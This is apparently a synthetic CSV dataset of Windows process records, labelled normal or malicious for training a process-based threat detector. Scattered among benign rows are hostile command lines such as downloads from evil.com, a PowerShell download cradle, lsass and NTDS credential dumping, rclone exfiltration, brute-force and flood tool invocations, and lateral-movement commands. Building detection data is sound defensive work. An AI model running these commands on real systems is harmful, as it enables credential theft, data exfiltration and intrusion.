process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
Dropbox.exe,Dropbox.exe,8.770556725440391,0.6027275368338382,1,12,0,normal,synthetic_normal,
git-remote-https.exe,git-remote-https.exe,29.989177863924656,7.753051104829935,0,20,0,normal,synthetic_normal,
csrss.exe,csrss.exe,4.973742747744387,4.523155982587533,1,16,0,normal,synthetic_normal,
mshta.exe,mshta.exe vbscript:Execute,27.533740568596144,12.540789477853272,0,3,0,malware,mitre_malicious_scripts,high
ssh-add.exe,ssh-add.exe,12.390261820018713,1.246084375657786,0,12,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,15.94062208494418,0.6344987644317999,0,1,0,normal,synthetic_normal,
powershell.exe,powershell.exe IEX(New-Object Net.WebClient).downloadString,67.62117414993963,7.940236101173435,1,3,0,malware,mitre_malicious_scripts,critical
Autoruns64.exe,Autoruns64.exe,0.9705269362657176,2.388242666997799,0,20,0,normal,synthetic_normal,
go.exe,go.exe,6.964605320587767,4.430193961376424,0,3,0,normal,synthetic_normal,
Code.exe,Code.exe,15.709848469109552,2.6259409844088784,0,5,0,normal,synthetic_normal,
Autoruns64.exe,Autoruns64.exe,16.95096017319966,0.8864586937917811,1,0,0,normal,synthetic_normal,
cmd.exe,cmd.exe,24.833025595504232,1.040587710958804,1,0,0,normal,synthetic_normal,
csrss.exe,csrss.exe,7.343624924405308,5.429460722305071,1,14,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,82.0479654385208,39.51556832185072,1,1749,0,ddos,ddos_tools,
winlogon.exe,winlogon.exe,11.862200912134291,6.237666961783937,1,1,0,normal,synthetic_normal,
Premiere.exe,Premiere.exe,17.118205383845588,2.405035989847493,1,15,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,13.653081748384125,4.804298065993973,0,19,0,normal,synthetic_normal,
Photoshop.exe,Photoshop.exe,8.232091408322601,2.122898790066917,0,1,0,normal,synthetic_normal,
godpotato.exe,godpotato.exe -cmd cmd /c whoami,34.263925282753576,6.687389799006514,0,0,0,privilege_escalation,mitre_privilege_escalation,critical
sihost.exe,sihost.exe,24.988681914508735,3.8755710802465835,0,13,0,normal,synthetic_normal,
ShellExperienceHost.exe,ShellExperienceHost.exe,26.095951992687294,5.583131507197499,0,20,0,normal,synthetic_normal,
MpCmdRun.exe,MpCmdRun.exe,1.8041991130444934,1.0821806283951536,0,16,0,normal,synthetic_normal,
webpack.exe,webpack.exe,14.26483630338781,3.116540520489821,0,15,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,85.36223158526505,24.838445176997425,1,115,0,ddos,ddos_tools,
vbc.exe,vbc.exe,14.937897511691684,4.509713674184415,0,1,0,normal,synthetic_normal,
System Idle Process,System Idle Process,98.98340224859385,0.1971667992349495,0,16,1,normal,synthetic_normal,
sublime_text.exe,sublime_text.exe,19.468622723130505,3.738349505005462,0,19,0,normal,synthetic_normal,
Everything.exe,Everything.exe,20.45535729861777,6.701164663269888,1,18,0,normal,synthetic_normal,
Everything.exe,Everything.exe,19.794075508170373,3.8015361028366295,1,20,0,normal,synthetic_normal,
blackcat.exe,blackcat.exe --silent,59.088693943467554,23.978735572951685,1,9,0,malware,known_malware,
MsSense.exe,MsSense.exe,3.5996866977438846,7.826032518738147,0,18,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,41.396661787850995,5.942341908140932,1,462,0,brute_force,brute_force_tools,
smartscreen.exe,smartscreen.exe,17.93151494454906,3.725933966487733,0,8,0,normal,synthetic_normal,
cmd.exe,cmd.exe,20.88158081322949,2.9974416125096304,0,2,0,normal,synthetic_normal,
cobalt_strike,beacon.exe,23.003976709995676,21.53670625371832,1,7,0,trojan,mitre_command_control,critical
MsSense.exe,MsSense.exe,19.07331288402539,6.204365829338035,0,16,0,normal,synthetic_normal,
Discord.exe,Discord.exe,13.573164865984621,1.7125038612808223,0,18,0,normal,synthetic_normal,
explorer.exe,explorer.exe,2.6213066870179724,3.9411169034089637,0,2,0,normal,synthetic_normal,
hive.exe,hive.exe --silent,35.6586181252954,18.897207917137358,1,8,0,malware,known_malware,
java.exe,java.exe,53.06874894599988,34.12934870943507,0,4,0,normal,synthetic_normal,
javaws.exe,javaws.exe,18.418903106976895,1.2702571860415344,0,7,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,29.83009956289671,2.2710632044327026,0,10,0,normal,synthetic_normal,
ssh.exe,ssh.exe,23.646903055294473,7.236225566496079,0,13,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,80.34282907973007,25.69665753856977,1,1568,0,ddos,ddos_tools,
Skype.exe,Skype.exe,11.60925940016321,1.0737967563155286,0,17,0,normal,synthetic_normal,
empire,launcher.bat,58.185909884117905,15.711654677244415,1,10,0,trojan,mitre_command_control,critical
iCloudServices.exe,iCloudServices.exe,17.70991716067573,4.69510926633363,1,3,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",77.96334503233925,19.538427396415294,1,264,0,brute_force,brute_force_tools,
wget.exe,wget.exe http://evil.com/malware.exe,45.24228899283562,15.901636833291263,0,6,0,malware,mitre_download_execute,medium
MpCmdRun.exe,MpCmdRun.exe,5.223088412940037,3.6105966473374393,1,14,0,normal,synthetic_normal,
zsh.exe,zsh.exe,2.2987312760622047,4.36276613538341,1,12,0,normal,synthetic_normal,
goland64.exe,goland64.exe,5.7156386036379105,3.4430328706281643,0,7,0,normal,synthetic_normal,
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,78.26480446576639,15.29205248040962,1,0,0,data_exfiltration,mitre_data_exfiltration,critical
hoic.exe,hoic.exe,82.31023678411162,29.352803494582414,1,345,0,ddos,ddos_tools,
powershell.exe,powershell.exe,18.804413771050523,4.547739079075209,0,9,0,normal,synthetic_normal,
Autoruns.exe,Autoruns.exe,11.800422378704262,7.2609030408813044,1,20,0,normal,synthetic_normal,
cmake.exe,cmake.exe,22.35694528334829,7.117955733008495,0,9,0,normal,synthetic_normal,
java.exe,java.exe,47.4783303917493,17.97338639234502,0,15,0,normal,synthetic_normal,
hoic.exe,hoic.exe,83.43158041154037,33.19963951455277,1,350,0,ddos,ddos_tools,
MSACCESS.EXE,MSACCESS.EXE,20.900558521291668,6.763298451360726,0,4,0,normal,synthetic_normal,
pycharm64.exe,pycharm64.exe,21.283149402810732,1.9591646694228242,0,3,0,normal,synthetic_normal,
notpetya.exe,notpetya.exe --silent,86.41547740185095,23.17328622420236,1,14,0,malware,known_malware,
Spotify.exe,Spotify.exe,0.911212529987292,7.138221661365733,1,17,0,normal,synthetic_normal,
goland64.exe,goland64.exe,16.379630345534977,5.783789363352159,0,18,0,normal,synthetic_normal,
idea64.exe,idea64.exe,19.202953345928506,2.891769854044097,1,7,0,normal,synthetic_normal,
netwire.exe,netwire.exe --silent,73.81501812751308,22.304782723658775,1,4,0,malware,known_malware,
stress.exe,stress.exe --cpu 8 --io 4,81.14830257637979,23.400001081610128,1,508,0,ddos,ddos_tools,
lockbit.exe,lockbit.exe --silent,62.46097585203582,11.12088658528045,1,5,0,ransomware,known_malware,
sihost.exe,sihost.exe,21.935926016154873,1.6581296031641455,0,8,0,normal,synthetic_normal,
Zoom.exe,Zoom.exe,14.652171329849633,2.1906656852316946,0,2,0,normal,synthetic_normal,
Signal.exe,Signal.exe,21.470320032590656,2.5660095247869887,0,0,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,15.16134646170199,7.931143135011183,0,7,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,51.57225693576934,17.00988890136958,1,152,0,brute_force,brute_force_tools,
wscript.exe,wscript.exe //E:vbscript malware.txt,64.34302319261232,19.445449982069547,0,4,0,malware,mitre_malicious_scripts,medium
wscript.exe,wscript.exe //E:vbscript malware.txt,20.023966509236,22.441785381633643,1,6,0,malware,mitre_malicious_scripts,medium
tsc.exe,tsc.exe,17.700322016481095,4.723651328915902,1,12,0,normal,synthetic_normal,
firefox_update.exe,firefox_update.exe --silent,76.49284681999252,22.97167458216478,1,28,0,malware,known_malware,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,93.73070991921546,17.42397466988528,1,437,0,brute_force,brute_force_tools,
lync.exe,lync.exe,8.315093074020185,1.9839112317052374,0,9,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,90.0745662207248,21.693095783968158,1,1608,0,ddos,ddos_tools,
GoogleDriveSync.exe,GoogleDriveSync.exe,22.653343136998167,6.915215606326344,1,14,0,normal,synthetic_normal,
notepad++.exe,notepad++.exe,22.63633777015361,4.3960233206165675,0,16,0,normal,synthetic_normal,
hive.exe,hive.exe --silent,76.58855198884882,32.288881427887816,1,3,0,malware,known_malware,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,81.80471032341747,22.98449095776661,1,386,0,ddos,ddos_tools,
rar.exe,rar.exe a -hp archive.rar C:\Data,52.68416763371487,23.13544988246818,1,3,0,data_exfiltration,mitre_data_exfiltration,medium
npx.exe,npx.exe,5.531460373329475,7.040907398650303,0,14,0,normal,synthetic_normal,
sihost.exe,sihost.exe,21.817917164599542,0.6152069206056214,0,19,0,normal,synthetic_normal,
postgres.exe,postgres.exe,10.690815748389909,7.090566465456621,0,15,0,normal,synthetic_normal,
javaw.exe,javaw.exe,29.19566551628165,4.906304110388273,0,6,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,86.8727305877514,24.760262780285963,1,497,0,ddos,ddos_tools,
pythonw.exe,pythonw.exe,26.995009763360923,3.8773897896197624,0,3,0,normal,synthetic_normal,
hoic.exe,hoic.exe,98.10039174013434,22.275714056815133,1,182,0,ddos,ddos_tools,
SyncThing.exe,SyncThing.exe,27.91460436943433,2.4121255615071533,1,20,0,normal,synthetic_normal,
Code.exe,Code.exe,0.1312816837581443,2.2423174312627565,0,0,0,normal,synthetic_normal,
vlc.exe,vlc.exe,11.8145015080201,3.68668995410312,0,4,0,normal,synthetic_normal,
locker.exe,locker.exe --wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh,36.525015188250556,6.043848866167629,1,1,0,ransomware,mitre_ransomware,critical
Zoom.exe,Zoom.exe,19.653933532559883,3.1615073135936074,0,12,0,normal,synthetic_normal,
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,62.95260499794875,19.92468156976161,0,30,0,reconnaissance,mitre_network_scanning,medium
mysqld.exe,mysqld.exe,16.811134600520404,4.234134562682328,0,12,0,normal,synthetic_normal,
hive.exe,hive.exe --silent,49.88643618659264,13.991880328134727,1,14,0,malware,known_malware,
OUTLOOK.EXE,OUTLOOK.EXE,0.1420634898483364,5.848450985325184,0,17,0,normal,synthetic_normal,
WmiPrvSE.exe,WmiPrvSE.exe,29.7208955320978,1.8823686155849477,0,6,0,normal,synthetic_normal,
godpotato.exe,godpotato.exe -cmd cmd /c whoami,50.311278866099045,7.160267186481488,0,2,0,privilege_escalation,mitre_privilege_escalation,critical
pnpm.exe,pnpm.exe,6.8351401018911915,7.3800766926980605,0,7,0,normal,synthetic_normal,
csc.exe,csc.exe,17.714964312461788,0.707495520232621,0,2,0,normal,synthetic_normal,
fontdrvhost.exe,fontdrvhost.exe,26.365017034545602,5.008552853366108,1,0,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,72.9103152139507,17.967735648492692,1,204,0,brute_force,brute_force_tools,
pingcastle.exe,pingcastle.exe --healthcheck,28.082183522136788,23.121605943463106,0,5,0,reconnaissance,mitre_reconnaissance,medium
GoogleDriveSync.exe,GoogleDriveSync.exe,13.92286784217598,6.435830461395084,0,14,0,normal,synthetic_normal,
wmiprvse.exe,wmiprvse.exe,14.193822830190356,7.467493281964832,0,20,0,normal,synthetic_normal,
mintty.exe,mintty.exe,16.344731375260363,4.951390851694256,0,10,0,normal,synthetic_normal,
7z.exe,7z.exe a -ppassword archive.7z C:\Confidential,65.64200151064239,23.790221009696182,1,9,0,data_exfiltration,mitre_data_exfiltration,medium
webstorm64.exe,webstorm64.exe,25.03307290327702,5.267055569762542,0,7,0,normal,synthetic_normal,
godpotato.exe,godpotato.exe -cmd cmd /c whoami,61.31533838973223,13.784330626874537,0,7,0,privilege_escalation,mitre_privilege_escalation,critical
webpack.exe,webpack.exe,1.3680792102565764,1.9843603876301756,0,3,0,normal,synthetic_normal,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,71.2113806246385,16.19216224940562,1,328,0,brute_force,brute_force_tools,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",68.26523517393807,7.287430986898524,1,302,0,brute_force,brute_force_tools,
SgrmBroker.exe,SgrmBroker.exe,10.067052111323227,2.9412605106350074,0,12,0,normal,synthetic_normal,
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe -t *,40.63478073389412,7.27326180743455,1,10,0,privilege_escalation,mitre_privilege_escalation,critical
redis-server.exe,redis-server.exe,6.896304895332088,6.324120872097873,1,7,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,52.890288248837365,9.404035720297681,1,127,0,brute_force,brute_force_tools,
Spotify.exe,Spotify.exe,29.25356914563609,0.8201814722933805,1,18,0,normal,synthetic_normal,
ShellExperienceHost.exe,ShellExperienceHost.exe,20.36097865586247,2.480743079588344,1,7,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",81.04303653917543,10.442123333346094,1,441,0,brute_force,brute_force_tools,
python3.exe,python3.exe,6.39375556970177,7.771960906207313,1,5,0,normal,synthetic_normal,
wmiprvse.exe,wmiprvse.exe,11.093348388045216,6.77971236676159,0,3,0,normal,synthetic_normal,
7zFM.exe,7zFM.exe,18.62422525003099,4.24408960660606,1,18,0,normal,synthetic_normal,
NisSrv.exe,NisSrv.exe,21.141591242979576,1.8547661420497774,1,1,0,normal,synthetic_normal,
spoolsv.exe,spoolsv.exe,11.324204229514601,2.7659915023236294,0,18,0,normal,synthetic_normal,
gcc.exe,gcc.exe,23.924069079800933,6.564241745308748,0,16,0,normal,synthetic_normal,
ConEmuC64.exe,ConEmuC64.exe,3.0464752494600233,2.145092082006925,0,0,0,normal,synthetic_normal,
rider64.exe,rider64.exe,28.815078025956463,2.989149456438506,0,12,0,normal,synthetic_normal,
SecurityHealthService.exe,SecurityHealthService.exe,20.068325287675115,6.909087969803842,1,4,0,normal,synthetic_normal,
winlogon.exe,winlogon.exe,11.53165116000672,3.0678085315840455,0,5,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,89.08149491760153,28.19223377168242,1,836,0,ddos,ddos_tools,
redis-server.exe,redis-server.exe,6.824461896762596,1.829407516474136,0,9,0,normal,synthetic_normal,
ntdsutil.exe,"ntdsutil.exe ""ac i ntds"" ifm",62.76296915933794,21.56303888853451,1,2,0,credential_dumping,mitre_credential_dumping,critical
wmplayer.exe,wmplayer.exe,12.332112866301912,4.270600749108086,0,2,0,normal,synthetic_normal,
Memory Compression,Memory Compression,29.05819060394755,3.3056892508657434,0,17,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,9.21337239691436,2.8940775077801453,0,13,0,normal,synthetic_normal,
vivaldi.exe,vivaldi.exe,6.456680325459249,0.9261370680892043,0,2,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,28.27029454353057,6.70778420414455,0,8,0,normal,synthetic_normal,
MpCmdRun.exe,MpCmdRun.exe,17.053954925919832,6.017767492891897,1,16,0,normal,synthetic_normal,
iCloudServices.exe,iCloudServices.exe,22.529948069808558,7.656567329628169,0,11,0,normal,synthetic_normal,
Blender.exe,Blender.exe,27.361616291377864,7.0728681484828195,0,5,0,normal,synthetic_normal,
peazip.exe,peazip.exe,12.088472131078031,3.412862160039251,0,0,0,normal,synthetic_normal,
ProcessHacker.exe,ProcessHacker.exe,2.1838859534607504,3.2038765813028474,0,12,0,normal,synthetic_normal,
bash.exe,bash.exe,12.174408450066746,7.915753179205227,0,9,0,normal,synthetic_normal,
mongod.exe,mongod.exe,1.9387603761175032,7.015257984722832,0,13,0,normal,synthetic_normal,
masscan.exe,masscan.exe -p1-65535 192.168.1.0/24,22.950425565444746,23.706024859523286,0,21,0,reconnaissance,mitre_network_scanning,medium
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,95.92076501334586,19.271306917353897,1,499,0,brute_force,brute_force_tools,
com.docker.proxy.exe,com.docker.proxy.exe,0.9010293972976702,3.962746454270366,0,17,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,70.06740770724778,11.35988918737527,1,106,0,brute_force,brute_force_tools,
idea64.exe,idea64.exe,22.36684818808064,1.9056771648466972,0,9,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,84.55656842000849,31.14203129922515,1,458,0,ddos,ddos_tools,
7zFM.exe,7zFM.exe,27.913529744943922,3.8664230430427473,0,6,0,normal,synthetic_normal,
sh.exe,sh.exe,20.075934672157427,7.161880125145072,0,4,0,normal,synthetic_normal,
tsc.exe,tsc.exe,2.677151865058174,1.3926257360609422,0,15,0,normal,synthetic_normal,
wininit.exe,wininit.exe,4.5211649231494455,3.400203039168307,1,7,0,normal,synthetic_normal,
hoic.exe,hoic.exe,96.58971369006639,37.98778428400969,1,145,0,ddos,ddos_tools,
rider64.exe,rider64.exe,8.449555957590679,6.5535288776871665,1,3,0,normal,synthetic_normal,
services.exe,services.exe,19.731167702367184,5.011913991095923,0,0,0,normal,synthetic_normal,
make.exe,make.exe,19.90637328626098,2.634469055021907,0,14,0,normal,synthetic_normal,
WmiPrvSE.exe,WmiPrvSE.exe,11.233607726514114,4.232464736933414,1,4,0,normal,synthetic_normal,
webpack.exe,webpack.exe,23.043560885773886,4.689576384974573,0,0,0,normal,synthetic_normal,
code.exe,code.exe,28.01271499667606,5.2855100056509645,0,2,0,normal,synthetic_normal,
mshta.exe,mshta.exe http://evil.com/payload.hta,40.2717538421068,7.954995269005076,0,1,0,malware,mitre_malicious_scripts,critical
POWERPNT.EXE,POWERPNT.EXE,7.7943418449726,2.313792914834513,1,20,0,normal,synthetic_normal,
procexp64.exe,procexp64.exe,6.580023368886387,4.924486737248101,1,8,0,normal,synthetic_normal,
printspoofer.exe,printspoofer.exe -i -c cmd,46.335619920732256,7.184943484243478,1,3,0,privilege_escalation,mitre_privilege_escalation,critical
vite.exe,vite.exe,15.70706338591602,7.952405477434102,0,16,0,normal,synthetic_normal,
psexec.exe,psexec.exe \\192.168.1.1 -u admin -p pass cmd,58.209684547844134,19.59680931175793,1,3,0,lateral_movement,mitre_lateral_movement,critical
MpCmdRun.exe,MpCmdRun.exe,6.857967167789713,6.182015683474219,0,1,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,14.207553764618611,1.2570361025697454,0,2,0,normal,synthetic_normal,
taskhostw.exe,taskhostw.exe,29.619299113584205,3.403432288571681,0,8,0,normal,synthetic_normal,
smbexec.py,python smbexec.py domain/user:pass@target,76.5889063791112,9.261675752557233,1,8,0,lateral_movement,mitre_lateral_movement,critical
SearchApp.exe,SearchApp.exe,2.311289924762133,4.230908688938761,1,12,0,normal,synthetic_normal,
TrustedInstaller.exe,TrustedInstaller.exe,25.404223879725006,4.011658242025649,0,19,0,normal,synthetic_normal,
evil-winrm.rb,evil-winrm -i target -u user -p pass,32.9379632969104,22.42469083507396,1,3,0,lateral_movement,mitre_lateral_movement,critical
procdump64.exe,procdump64.exe -accepteula -ma lsass.exe,44.6303716868846,24.742121518631993,0,3,0,credential_dumping,mitre_credential_dumping,critical
lsass.exe,lsass.exe,11.015080599825737,5.3510482325119515,1,16,0,normal,synthetic_normal,
mshta.exe,mshta.exe http://evil.com/payload.hta,35.24729107870279,14.150354889637422,1,7,0,malware,mitre_malicious_scripts,critical
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",45.85791450404899,14.924352471339175,1,376,0,brute_force,brute_force_tools,
